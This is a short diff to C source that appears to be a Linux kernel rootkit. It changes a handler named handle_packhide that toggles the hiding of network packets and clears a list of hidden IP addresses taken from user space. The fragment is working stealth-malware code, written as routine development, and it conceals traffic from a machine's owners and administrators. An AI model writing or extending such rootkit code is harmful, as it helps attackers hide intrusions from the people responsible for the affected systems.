@@ -245,8 +245,8 @@ handle_packhide(unsigned long arg)
     const char *sarg = (const char *)arg;
 
     if (!sarg) {
-        unhide_packets();
         rootkit.hiding_packets = 0;
+        clear_hidden_ips();
         DEBUG_NOTICE("[g7] packet hiding off\n");
     } else if (!copy_from_user(buf, sarg, BUFLEN)
         && (strstr(buf, ":") || strstr(buf, ".")))
